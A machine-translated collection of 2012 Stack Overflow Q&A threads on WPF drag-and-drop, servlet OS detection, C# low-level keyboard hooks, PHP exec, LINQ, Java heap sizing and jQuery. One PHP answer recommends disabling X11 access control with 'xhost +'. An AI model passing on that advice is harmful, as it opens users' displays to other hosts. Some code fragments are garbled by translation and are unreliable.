            var drop = _listBox.SelectedItem as Export.Domain.Components.Component;
            var target = listBoxItem.DataContext as Export.Domain.Components.Component;

            var listBoxItem = GetlistBoxItemControl(listBoxItem);

            if (IsInFirstHalf(listBoxItem, e.GetPosition(listBoxItem)))
            {
                var vm = this.DataContext as ComponentlistBoxModel;
                vm.DropBefore(drop, target);
            }                
            else if (IsInLastHalf(listBoxItem, e.GetPosition(listBoxItem)))
            {
                var vm = this.DataContext as ComponentlistBoxModel;
                vm.DropAfter(drop, target);
            }
        }
    }

    public static bool IsInFirstHalf(FrameworkElement container, Point mousePosition)
    {
        return mousePosition.Y < (container.ActualHeight/2);
    }

    public static bool IsInLastHalf(FrameworkElement container, Point mousePosition)
    {
        return mousePosition.Y > (container.ActualHeight/2);
    } 
```

您可能不喜欢我的代码隐藏按类型具体引用视图模型的事实，但它完成了工作，并且快速简单，并且从技术上讲它不会破坏 MVVM 模式。我仍然将逻辑留给视图模型。

**Addition 1** Animations 可能会提供您正在寻找的效果。在我的实现中，交换发生在丢弃时。但是，您可以通过使用装饰器并在拖动时进行交换来实现动画效果。拖动事件将更新装饰器位置和集合中对象的索引。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-03T12:01:09.150

虽然我自己没有提出解决方案，但我曾经遇到过一篇博客文章，我认为它通过使用附加属性和装饰器实现了出色的关注点分离，完全符合您的要求。在这里看一下：[ZagStudio](http://www.zagstudio.com/blog/488#.UJUGNq7-z4v)。希望能帮助到你。

# java - 在 java Web 应用程序中使用请求对象识别客户端计算机操作系统

> ID：13076057
> 
> 赞同：1
> 
> 时间：2012-10-25T19:45:38.150
> 
> 标签：java, jakarta-ee, servlets

> **可能重复：**
> [如何获取客户端信息，例如操作系统和浏览器](https://stackoverflow.com/questions/1326928/how-can-i-get-client-infomation-such-as-os-and-browser)

`servlet` 当我在通过`request`对象 中收到请求时，我想知道客户端机器操作系统名称

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:11:26.853

[使用user-agent-utils](https://code.google.com/p/user-agent-utils/)库的示例：

```
public class SomeServlet extends HttpServlet {
  public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
      String userAgentString = request.getHeader("User-Agent");
      UserAgent userAgent = UserAgent.parseUserAgentString(userAgentString);
      OperatingSystem os = userAgent.getOperatingSystem();

      // Do stuff with os...
  }
} 
```

[您可以在此处](https://code.google.com/p/user-agent-utils/)阅读有关 OperatingSystem 类的更多信息。

你可以[在这里找到罐子。](https://code.google.com/p/user-agent-utils/downloads/detail?name=UserAgentUtils-1.2.3.jar)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T19:51:41.067

使用用户代理 HTTP 标头。这是它在我的机器上的样子：

`user-agent Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4`

如您所见，它是一个自由格式的文本，因此您必须调查不同的用户代理并使用可能的正则表达式来处理它们。

# c# - 来自 rawinput 的低级键盘钩子和击键

> ID：13076060
> 
> 赞同：6
> 
> 时间：2012-10-25T19:45:48.310
> 
> 标签：c#, keyboard-hook, raw-input, low-level-api

目前，我正在制作一个程序来拦截来自特定键盘的击键（使用其 HID 过滤）。因此，为了了解特定设备发送了哪些击键，我使用了 RawInput 技术，灵感来自这个很棒的教程：

[http://www.codeproject.com/Articles/17123/Using-Raw-Input-from-C-to-handle-multiple-keyboard](http://www.codeproject.com/Articles/17123/Using-Raw-Input-from-C-to-handle-multiple-keyboard)

现在，它工作得很好：我可以得到一个击键并知道哪个键盘产生了它。

我项目的难点在于拦截并阻止来自这个特定键盘的击键，以避免这些击键到达焦点应用程序（焦点指操作系统带来的前台窗口）。

因此，自然的解决方案是在所有当前具有窗口句柄的线程上使用低级别的全局挂钩。

我使用并修改了此页面中的代码来做到这一点：

[http://blogs.msdn.com/b/toub/archive/2006/05/03/589423.aspx](http://blogs.msdn.com/b/toub/archive/2006/05/03/589423.aspx)

我在 Visual Studio 中创建了一个新项目，以避免把我的工作弄得一团糟。经过一番研究，我能够通过在回调函数中返回值 (-1) 来阻止所有应用程序的击键：

```
private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)  
{
//Check if we have a key to pass

if (
    nCode >= 0 && ( 
    (wParam == (IntPtr)WM_KEYDOWN) || (wParam == (IntPtr)WM_KEYUP) ) 
    )
{
    int vkCode = Marshal.ReadInt32(lParam);
    if ((Keys)vkCode == Form1.KeysToIgnore)
    {
        return (IntPtr)(-1);
    }
}
return CallNextHookEx(_hookID, nCode, wParam, lParam);
} 
```

为了将所有内容放在一起（挂钩过程和击键检测），我在最终项目中创建了两个线程：

**第**一种：使用 RawInput 识别每次击键并将其附加到设备

**2nd** : 用于钩住所有窗口并阻止某些击键

线程 1 旨在将击键发送到线程 2，线程 2 读取发送到所有窗口应用程序的所有消息，并从特定键盘删除击键。我确切地说这两个线程是同步的。

问题是钩子似乎是在执行 Rawinput 之前执行的，所以我无法识别发送击键的键盘。我不知道该怎么做，也许要改变钩子的类型（避免使用低级键盘钩子，但使用用户空间级键盘钩子）。

或者也许有人知道一个聪明的方法来做我想做的事？

我知道这个请求真的很复杂，不要犹豫，询问更多细节。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-30T17:11:18.440

好的，Silence Dogood 给了我一个很好的线索：

图书馆拦截非常适合我使用。你可以在这里找到它：

[https://github.com/oblitum/Interception](https://github.com/oblitum/Interception)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-03T16:06:24.857

我试图做同样的想法，让条形码扫描仪（使用隐藏键盘仿真）被软件变成红色而不被用作输入。

我找到了这个，但我不太清楚如何使用它，因为它不是完整的代码，而且我是 C# 新手，希望我能帮助你帮助我：

[截取键盘](http://ase.com.ua/?p=130)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-22T18:51:38.900

如果您在 .net 应用程序中实现此功能，我个人推荐[EasyHook](http://easyhook.codeplex.com/)，这将让您做的不仅仅是拦截击键，而且它非常易于使用。

# perl - perl 打印出 select 语句的结果

> ID：13076062
> 
> 赞同：0
> 
> 时间：2012-10-25T19:45:53.767
> 
> 标签：perl, dbi

我是 perl 的新手。打印选择语句 (DBI) 结果的最佳方法是什么。我希望能够将它打印到一个文件中（并很好地格式化它），并且能够将它存储在一个变量中（带有格式化（\n ...和其他东西）），因为我希望能够通过电子邮件发送给结果，所以我将附加文件或使用正文。我已经有一个我想使用的电子邮件模块（MIME::Lite::TT::HTML）。谢谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T08:07:45.470

您说您知道如何遍历内容，然后您可以`$sth->execute`查询、遍历结果以及`print`您想要的任何地方。

您可以使用[`sprintf()`](http://perldoc.perl.org/functions/sprintf.html)来格式化结果，或者，正如您所提到的，使用[`Template::Toolkit`](http://search.cpan.org/~abw/Template-Toolkit-2.24/lib/Template/Toolkit.pod)

我知道这可能对您没有太大帮助，但是如果您不向我们展示您的 SQL 查询、一些示例格式和一些您尝试过的启动代码，我们将无法进一步帮助您。

此外，如果您想快速完成工作，阅读一些 perl 教程会对您有很大帮助。互联网上有许多[**非常好的免费 perl 教程**](http://perl-tutorial.org/)

# php - 我可以用 PHP 运行 export DISPLAY 吗？

> ID：13076063
> 
> 赞同：0
> 
> 时间：2012-10-25T19:45:55.933
> 
> 标签：php, linux, export

如果我尝试在我的 PHP 脚本中运行命令 export DISPLAY ，它将无法工作，但如果我通过命令行运行它，它确实可以工作。这是一个已知问题还是有更好的方法？

该脚本正在通过网页调用。

我的 PHP 命令：

```
$process = 'export DISPLAY=:0 && ' . $command;
exec("$process $htmlname $exportname"); 
```

我从网页运行时看到的错误是：

```
Gtk-WARNING **: cannot open display: 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T19:56:14.803

您可以在系统调用之前设置环境，例如[http://php.net/manual/en/function.putenv.php](http://php.net/manual/en/function.putenv.php)。这可能会导致在 Web 服务器桌面上打开一个窗口。您可能还需要使用 xhost + 禁用 X11 xauth 身份验证

# nuget - VS 项模板 NuGet 包

> ID：13076067
> 
> 赞同：3
> 
> 时间：2012-10-25T19:46:07.430
> 
> 标签：nuget, itemtemplate, nuget-package

我没有找到任何有关 VS 项目模板的 NuGet 包装的信息。我希望使用本地 NuGet 服务作为内部项目项目模板的存储库。有没有人有这方面的知识？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T15:10:01.037

只是在寻找一个类似的功能，发现[这个](http://nuget.codeplex.com/workitem/1324) 看起来像安装visual studio扩展的功能请求被拒绝，指向这个可能对你有帮助的[包](http://nuget.org/packages/VsixCommands)。

# java - 第二个 servlet 不调用 WebService

> ID：13076081
> 
> 赞同：1
> 
> 时间：2012-10-25T19:47:07.233
> 
> 标签：java, html, web-services, jakarta-ee, servlets

我正在使用 Java 并使用带有 Glashfish 的 NetBeans。我正在编写一个类似于电话簿的简单程序，我有两个 servlet 和一个 WebService。第一个 servlet 创建表单，提示用户输入并将所述输入发送到第二个 servlet。

然后第二个 servlet 从另一个项目调用 WebService，获取与用户输入的姓名相关的相应电话号码。但是我怎样才能让第二个 servlet 调用 WebService？

第二个小服务程序：

```
package com.temp;

import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = "ResultServlet", urlPatterns = {"/ResultServlet"})
public class ResultServlet extends HttpServlet {

    /**
     * Processes requests for both HTTP
     * <code>GET</code> and
     * <code>POST</code> methods.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    protected void processRequest(HttpServletRequest request, HttpServletResponse   response)
            throws ServletException, IOException {
        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();
        try {
            /* TODO output your page here. You may use following sample code. */
            out.println("<html>");
            out.println("<head>");
            out.println("<title>Servlet ResultServlet</title>");            
            out.println("</head>");
            out.println("<body>");

            out.println("<h1>Phone Number:</h1>");

            String person = request.getParameter("userName");

            //out.println(person);  --> TEST to see if ResultServlet can get "string" from FormServlet.... IT CAN!! :)

            String phone = getPerson(person); //THIS IS WHAT CANNOT BE ACCOMPLISHED!!!

            //out.println(phone);

            out.println("</body>");
            out.println("</html>");
        } finally {            
            out.close();
        }
    }

    // <editor-fold defaultstate="collapsed" desc="HttpServlet methods. Click on the + sign on the left to edit the code.">
    /**
     * Handles the HTTP
     * <code>GET</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    /**
     * Handles the HTTP
     * <code>POST</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    /**
     * Returns a short description of the servlet.
     *
     * @return a String containing servlet description
     */
    @Override
    public String getServletInfo() {
        return "Short description";
    }// </editor-fold>
} 
```

网络服务：

```
package com.temp;

import com.sun.xml.ws.developer.servlet.HttpSessionScope;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import javax.jws.WebService;
import javax.jws.WebMethod;
import javax.jws.WebParam;

@HttpSessionScope
@WebService(serviceName = "Lookup")
public class Lookup {

    String phoneNum="";

    private HashMap<String, String> theBook = new HashMap<String, String>();

        public Lookup() {
        theBook.put("person1", "941-111-1111");
        theBook.put("person2", "941-222-2222");
        theBook.put("person3", "941-333-3333");
        theBook.put("person4", "941-444-4444");
        theBook.put("person5", "941-555-5555");

    }

    /**
     * Web service operation
     */
    @WebMethod(operationName = "getPerson")
    public String getPerson(String personName) {
        phoneNum = "";
        if (theBook.containsKey(personName)) {
            phoneNum = theBook.get(personName);
        }

        return phoneNum;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:41:18.800

您应该能够使用 netbeans 生成服务客户端。

独立于您的 IDE，您可以使用[Axis2](http://axis.apache.org/axis2/java/core/docs/userguide-creatingclients.html#createclients)来生成客户端。

这些工具通常会为您生成一些易于使用的 java 类。

# asp.net - 如果 asp.net 表单 textbox.text >0，则验证下拉列表选定值 > 0

> ID：13076082
> 
> 赞同：0
> 
> 时间：2012-10-25T19:47:13.540
> 
> 标签：asp.net, vb.net, jquery-validate, validation, html-select

代码语言 = VB。ASP.NET 4.0

我的页面上有一个 formview 控件，默认为插入模式，所以当页面加载时，你唯一能做的就是插入一条记录。我有一个默认为“无”值的绑定下拉列表..这可以归类为休假类型..然后我旁边有一个文本框归类为小时..

我想验证是否有人为文本框输入时间，他们必须从下拉列表中选择一个值。

一旦我走到这一步，我就必须重复三次，所以我想找到一种方法来编写控件，或者分组或引用多个控件。

如果 txtbox1.text > 0 那么 dropdownlist1.selected 值必须 >0

我可能刚从那里开始就很接近，但我发现在 asp 中使用 formview 控件有点难以实际找到控件。我必须使用以下语句来处理任何痛苦的控件 directcast(formview1.findcontrol("textbox1"), textbox).text

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:01:02.897

为了使它更容易：做这样的事情：

```
With formview1
    Dim txtbox1Value as string = directcast(.findcontrol("textbox1"),textbox).Text
    Dim dropdownlist1Value as string = directcast(.FindControl("dropdownlist1"), DropDownList).SelectedValue
    if txtbox1Value > "0" Then
       if dropdownlist1Value <= "0" Then
           ' Error
       End If
       If dropdownlist1Value >= "100" Then
           ' Another error
       End If
    End If
    ' etc.
End With 
```

想法：预先以方便的形式获取您需要测试的所有值，然后实现您的逻辑。这将使你的逻辑更简单，因为你不会被你必须做的寻找和铸造分心。

实际上，您可以将所有这些包装在 CustomValidator 的 ServerValidate 事件中。

# c++ - Visual Studio 2010 - 源代码从项目文件夹中消失

> ID：13076083
> 
> 赞同：2
> 
> 时间：2012-10-25T19:47:17.350
> 
> 标签：c++, visual-studio-2010, visual-studio

我使用 Visual Studio 2010 创建了一个 Win32 控制台项目 (C++)，方法是将多个文件粘贴到解决方案资源管理器窗口中（该项目是作为一个空项目创建的）。但是当我转到我的项目的文件目录（压缩源文件）时，它们是不可见的。我的文件去哪儿了？:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T19:48:50.307

选择文件后尝试在属性窗口中查看 - 它应该为您提供它的路径

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T19:51:26.840

它可能创建了对您从中复制它们的原始路径的引用。您可能需要将它们复制到 Windows 资源管理器（Visual Studio 外部）中的正确文件夹，然后右键单击以将现有项目添加到项目中。

# java - 使用 java Rally Rest API 在 Rally 中更新测试集

> ID：13076089
> 
> 赞同：0
> 
> 时间：2012-10-25T19:47:40.193
> 
> 标签：java, rally, updates

```
QueryRequest allreleases = new QueryRequest("release");
    allreleases.setQueryFilter(new QueryFilter("project", "=", project_ref));
    QueryResponse resp = restApi.query(allreleases);
    if(resp.wasSuccessful()){

        System.out.println("list of all the release numbers available...");
        for(JsonElement result : resp.getResults()){
            System.out.println(result.getAsJsonObject().get("Name").getAsString());
            if(result.getAsJsonObject().get("_refObjectName").getAsString().equals("release 1")){
                System.out.println("Sdsadsad");
                temp_ref = result.getAsJsonObject().get("_ref").getAsString();
                System.out.println(temp_ref);
                }
            }
        }

    JsonObject updatt = new JsonObject();
    updatt.addProperty("release", temp_ref);

    UpdateRequest req1 = new UpdateRequest(testset_ref, updatt);
    UpdateResponse resp1 = restApi.update(req1);

    if(resp1.wasSuccessful()){
        System.out.println("release added to testset");

    } 
```

我正在使用这段代码对已经创建的测试集进行更新（添加“发布”）。代码运行但发布字段没有得到更新。我不知道我做错了什么。有什么提示吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T17:21:43.590

WSAPI 中的字段名称区分大小写，因此您可能需要“Release”而不是“release”才能使更新正常工作。使用上面的代码检查响应上的警告集合会显示一条消息，“release”是一个未知字段，它被忽略了。

正确的：

```
updatt.addProperty("Release", temp_ref); 
```

# c# - 如何使用 LINQ 从 varchar 列中查询日期范围

> ID：13076094
> 
> 赞同：0
> 
> 时间：2012-10-25T19:48:14.263
> 
> 标签：c#, sql-server, linq, entity-framework, date

我继承了一个大型 SQL Server 数据库，该数据库具有某个表，该表具有某个日期列，该列是**yyyyMMdd**日期字符串格式的 varchar(8) 数据类型。为什么它不是日期时间数据类型或类似的东西超出了我的范围。（也许是为了节省空间？旧版数据库很久以前就移植到了 SQL Server？）

无需对希望成为日期的字段过于慌张，使用实体框架（DBContext w/LINQ）从该列中使用单个日期获取行非常简单，如下所示：

```
var rows = cxt.TableOfRandomDateColumn.Where(x => x.Date == myDateStr).ToList(); 
```

这很容易。但是，如果我想从该列中获取一系列日期怎么办？做这样的事情的最好方法是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T19:54:59.057

yyyyMMdd 格式的日期按字母顺序和数字顺序正确排序，因此您可以像处理任何其他字符串列一样使用范围选择器。

试试这个：

```
var rows = cxt.TableOfRandomDateColumn.Where(x => x.Date >= myStrDateStr && x.Date <= myStpDateStr).ToList(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T19:57:26.463

如果日期是您所说的格式（例如，20121025），那么它们将被视为已正确排序，并且以下应该有效：

```
var rows = cxt.TableOfRandomDateColumn.Where(x => x.Date >= startDate && x.Date <= endDate).ToList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:01:53.103

将日期时间的 ParseExact 方法与您的自定义格式一起使用。然后您可以将其与表达式中的日期时间进行比较。

# linux - 带有 GUI 的 Linux 任务调度程序

> ID：13076095
> 
> 赞同：0
> 
> 时间：2012-10-25T19:48:18.663
> 
> 标签：linux, user-interface, scheduled-tasks

我知道这可能被认为是一个糟糕的问题，但它可以为我节省大量的编程工作，所以我希望不会......

基本上，我想知道是否有人强烈推荐可以运行 Oracle 存储过程、Java 应用程序或两者的作业调度程序。另一个先决条件是它带有一个开箱即用的漂亮的基于 Web 的管理 GUI，允许您配置新作业、安排/请求这些作业，并查看它们的状态、故障、下次运行时间等。

[黑曜石](http://carfey.com/)在纸面上真的很接近，但是一旦我启动并正常运行，它就一直抱怨没有许可证（即使我选择了无许可证选项），只是没有运行任何东西。也许我明天可以解决这个问题，但无论如何我可能更喜欢真正的开源。

我看过[http://en.wikipedia.org/wiki/List_of_job_scheduler_software](http://en.wikipedia.org/wiki/List_of_job_scheduler_software)（我可能会看一下开源作业调度程序），但我想知道是否有人可以通过一个好的起点为我节省更多的时间和精力?

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:05:03.963

[Webmin](http://doxfer.webmin.com/Webmin/ScheduledCommands)对您来说是否足够好？

# jquery - 使用 JQuery“模拟”拖放的简单方法？

> ID：13076096
> 
> 赞同：2
> 
> 时间：2012-10-25T19:48:18.543
> 
> 标签：jquery, jquery-ui, draggable, simulation, droppable

我有一个网页，允许用户将元素拖到可放置的 div 中。我正在使用 JQuery UI Draggable 和 Droppable。我想添加一个功能，如果您双击其中一个可拖动元素，它会“模拟”该元素的拖放 - 即它将元素拖动到屏幕上并将其放在可放置的 div 上。这样，用户可以选择拖放或双击。有什么方法可以轻松实现吗？（如果这太麻烦了，我可能只会编写双击代码来执行代码，然后弹出一个警报，说明它已经完成了。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:11:02.220

没有一段代码很难为你开发一些东西，但这里有一个想法：

您可以使用元素“双击”事件触发的[.animate()](http://api.jquery.com/animate/)函数将可拖动元素移动到放置区域。

[使用.offset()](http://api.jquery.com/offset/)功能计算目标位置应该不难。

然后，使用 .animate() 回调来执行放置动作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-21T08:47:47.060

我在这里发现了一个类似的问题：[jQuery：如何在代码中模拟拖放？](https://stackoverflow.com/questions/1166246/jquery-how-do-i-simulate-drag-and-drop-in-code) 我使用 Patrick McElhaney 提出的解决方案解决了：

```
 $(".mainpanel").droppable({
        drop: function (event, ui) {
            onDragAndDrop($(ui.draggable), $(event.target));
        }
    });

    button.dblclick(function () {
        onDragAndDrop($(this), $(".mainpanel"));
    });

    function onDragAndDrop(dragged, droppable) {
        // ...
    } 
```

# java - 将大文本文件读取到 HashMap - 堆溢出

> ID：13076097
> 
> 赞同：1
> 
> 时间：2012-10-25T19:48:44.980
> 
> 标签：java, hashmap, text-files, heap-memory

我正在尝试将文本文件中的数据获取到 HashMap 中。文本文件具有以下格式：

![在此处输入图像描述](../Images/158c1cede479f8096c3e7039db6997f7.png)

它有700万行......（大小：700MB）

所以我要做的是：我阅读每一行，然后我将字段用绿色连接起来，并将它们连接成一个字符串，该字符串将作为 HashMap 键。值将是红色区域。

每次我读到一行时，我都必须检查 HashMap 是否已经有一个带有这样的键的条目，如果是这样，我只需更新值，将值与红色相加；如果不是，则将新条目添加到 HashMap。

我用 70.000 行的文本文件尝试了这个，效果很好。

但是现在有了 700 万行文本文件，我得到了一个“java 堆空间”问题，如图所示：

![在此处输入图像描述](../Images/7871a4bfddaeb146e47b9d949a2dfb2c.png)

这是由于 HashMap 吗？是否可以优化我的算法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T19:51:43.883

你应该增加你的堆空间

```
-Xms<size>        set initial Java heap size
-Xmx<size>        set maximum Java heap size

java -Xms1024m -Xmx2048m 
```

[从 Java 代码到 Java 堆](http://www.ibm.com/developerworks/java/library/j-codetoheap/)的好读物

```
Table 3\. Attributes of a HashMap
Default capacity                     16 entries
Empty size                           128 bytes
Overhead                             64 bytes plus 36 bytes per entry
Overhead for a 10K collection   ~    360K
Search/insert/delete performance    O(1) — Time taken is constant time, regardless of the number of elements (assuming no hash collisions) 
```

`7 Million`如果您考虑上面的记录开销，`246 MB`那么您的最小堆大小必须在`1000 MB`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T21:54:18.347

除了更改堆大小之外，还可以考虑通过将密钥存储为打包二进制而不是字符串来“压缩”（编码）密钥。

每个 IP 地址可以存储为 4 个字节。端口号（如果是这样的话）每个是 2 个字节。该协议可能可以存储为一个字节或更少。

那是 13 个字节，而不是存储为 UTF16 字符串的 70 个字节，如果我的数学在晚上这个时候是正确的，那么键的内存减少了 5 倍……

# java - 带有 Mysql 数据的 JTable 需要在 JOINS 上有组合框

> ID：13076100
> 
> 赞同：0
> 
> 时间：2012-10-25T19:48:57.123
> 
> 标签：java, mysql, swing, join, jdbc

我使用 JTable 来显示 MySQL SELECT 查询的结果。这样的表模型代码：

```
public void setDataSource(ResultSet rs) throws Exception {  
    data.clear(); 
    columnNames.clear(); 
    columnTypes.clear(); 

    ResultSetMetaData rsmd = rs.getMetaData(); 
    int columnCount=rs md .getColumnCount(); 
    for (int i=0; i<columnCount; i++) { 
        columnNames.add(rsmd.getColumnName(i+1)); 
        Classtype =Cl as s.forName(rsmd.getColumnClassName(i+1)); 
        columnTypes.add(type); 
        // Here I need to detect is it a joined column
        // and if it is to set cell editor for this column to
        // a comboBox w/ data from joined table
    } 
    fireTableStructureChanged(); 
    while ( rs.next() ){ 
        ArrayListrow =new ArrayList(); 
        for ( int i=0; i<columnCount; i++) { 
            if(columnTypes.get(i) == String.class) 
             row.add(rs.getString(i+1)); 
            else 
             row.add(rs.getObject(i+1)); 
        } 
        synchronized(data){  
            data.add(row); 
            fireTableRowsInserted(data.size()-1,data .size()-1); 
        } 
    } 
} 
```

如您所见，某些列可能是通过 JOIN 操作获得的，因此我需要检测实际是什么并将它们的编辑器设置为带有 JOINED 表中可能值的组合框。我认为关于关系数据库和使用它们的良好手册或书籍 w/swing 也很好。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T06:24:18.527

假设您有一个基表，比如 A，与多个其他表连接。您的要求是显示从联接表中出来的列有所不同。

您可以尝试ResultSetMetaData 的[getTableName()](http://docs.oracle.com/javase/7/docs/api/java/sql/ResultSetMetaData.html#getTableName%28int%29)来获取该列所属的表的名称。像这样的东西：

```
int columnCount = resultSetMetaData.getColumnCount();
System.out.println("Total Columns: "+columnCount);
for(int index = 1; index <= columnCount; index++){
    System.out.print("Column Name: "+resultSetMetaData.getColumnName(index));
    System.out.println("Table Name: "+resultSetMetaData.getTableName(index));
} 
```

由于您已经知道基表名称，因此您始终可以使用它来比较您正在查看的当前列是否属于基表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T11:37:17.123

如果我理解的话，您将加入两个表，它们之间存在一对多关系。为了使讨论更简单，让我们假设您有一个名为部门的表和一个名为员工的表。每个部门可以有 0 个或多个员工。我们希望表中的每一行都显示一个部门和一个用于选择员工的组合框。

首先，将 ResultSet 直接传递到您的 TableModel 不是一个好习惯。如果您的表格旨在显示部门数据，您的表格模型应该接受部门对象的集合。

因此，您应该遍历结果集并创建 Department 对象的集合。每个部门对象都可以有一个 Employee 对象的集合。构建集合后，您可以将它们传递到您的 TableModel 中。

仅此一项不会给您一个组合框，但它可以清理事物并分离您的关注点。要将组合框用作单元格编辑器，您需要执行以下操作

```
TableColumn employeeColumn = table.getColumnModel().getColumn(someIndex);

JComboBox comboBox = new JComboBox();
comboBox.addItem("Snowboarding");
comboBox.addItem("Rowing");
comboBox.addItem("Chasing toddlers");
comboBox.addItem("Speed reading");
comboBox.addItem("Teaching high school");
comboBox.addItem("None");
sportColumn.setCellEditor(new DefaultCellEditor(comboBox)); 
```

上面的代码取自这里的 Oracle Java 教程：

[http://docs.oracle.com/javase/tutorial/uiswing/components/table.html](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html)

# jquery - .ToggleClass 在第一次点击时没有运行

> ID：13076101
> 
> 赞同：1
> 
> 时间：2012-10-25T19:48:58.690
> 
> 标签：jquery, html

我的 php 脚本为该图像放置了一个带有隐藏复选框的图像。单击图像时，其复选框设置为选中。然后我想在图像周围放置一个轮廓以显示图像被选中，而无需显示丑陋的复选框。为此，我创建了一个名为 $i 的 php var，它为每个输出的图像递增以充当图像 id，然后将 id 传递给 Javascript 函数并作为 jquery 选择器调用。

所有这一切都很好，但是当调用 toggleClass 事件时，它会以一种我以前从未经历过的方式进行。它不会在第一次点击时触发，但第二次会导致图像的突出显示与复选框的检查不同步，即

图片 > 点击 = 无高亮 || 复选框选中。

图片 > 第二次点击 = 图片突出显示 || 复选框未选中。

如果 addClass 事件被调用，那么它会起作用，在第一次点击时突出显示。但是当重写以删除第二次单击时的突出显示时，原始问题又回来了。（我使用带有.hasClass（）的if else语句来做到这一点，如果类'highlight'删除它，否则addclass highlight ...）

变量似乎没有问题，因为仅用 HTML 和 JS 中的数字 1 替换这些变量，问题仍然存在。

直接使用我正在使用的代码：

（例如，假设 php var $i 为 1，因为当这部分工作正常时，写出 for 循环等似乎有点毫无意义[当按钮时，锚的 href="" 也将被阻止被跟踪单击，从而使突出显示成为可能，此代码尚未编写，因此不会引起问题，我只是删除了 href='' 用于测试]）

HTML / PHP

```
// for this exmaple $i = 1;
// $id is the images unique id, the one used in the server for the image path

<a class='selectbox' id='hil' style='position:relative;' href='show-image.php?id=$id'>
    <div style='display:inline-block; padding:15px;' id=\"$i\" onclick=\"highlight('" . $i . "')\"  class='lifted drop-shadow-sq' >
        <label for=\"$id\">
            <img class='reflect reflect-br' width='150px;' height='150px' src=\"thumb.php?id=$id\">
        </label>
            <input id=\"$id\" style='display:non;' type='checkbox' class=\"show-man\" name='images[]' value='$id'>
    </div>
</a> 
```

jQuery

```
function highlight(x) { 
id = x;
    $('#' + id).click(function() {
        $(this).toggleClass('highlight');
    });
} 
```

CSS

```
.highlight img {
box-shadow:0 0 10px #5bb1ce;
} 
```

感谢您提前回复。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T19:54:06.250

您的`highlight()`函数将单击事件绑定到 div 元素。因此，第一次单击将绑定事件，第二次单击将实际执行代码。您可以通过两种方式更改它

由于您是 uisng`onclick`属性，因此您可以将突出显示功能更改为如下所示

```
function highlight(x) { 
  id = x;
  $('#' + id).toggleClass('highlight');
} 
```

或者在页面加载后删除`onclick`属性和绑定事件（我假设所有 div 都提升了类

```
$(document).ready(function(){
  $('.lifted').on('click', function(){
    $(this).toggleClass('highlight');
  });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T21:05:42.323

对，经过几个小时的挠头和拉头发后，我找到了解决方案。似乎我用来检查和取消选中复选框是导致问题的原因。不知道为什么？

所以我删除了它并为突出显示创建了一个简单的 Jquery 函数。（为了感谢 Zefiryn，这是对他的回复的轻微修改。）

```
$(document).ready(function(){
    $(".lifted").live('click', function() {
        $(this).toggleClass("highlight");
    });
}); 
```

然后，我从 html 中删除了标签，并使用复选框 id 中的图像唯一 id 将它们替换为 JavaScript 函数，以选中/取消选中复选框。

```
<div style='display:inline-block; padding:15px;' id=\"$i\" onclick=\"if (event.target.tagName != 'INPUT') document.getElementById('$id').checked = !document.getElementById('$id').checked\"  class='lifted drop-shadow-sq' >
    <img class='reflect reflect-br' width='150px;' height='150px' src=\"thumb.php?id=$id\">
        <input id=\"$id\" style='display:none;' type='checkbox' class=\"show-man\" name='images[]' value='$id'>
</div> 
```

CSS保持不变。

现在一切似乎都已排序并且工作正常，最后我必须感谢 Zefiryn 的上述帮助。

# javascript - 如何使用 javascript 或 jquery 添加和删除 html 元素？

> ID：13076102
> 
> 赞同：-2
> 
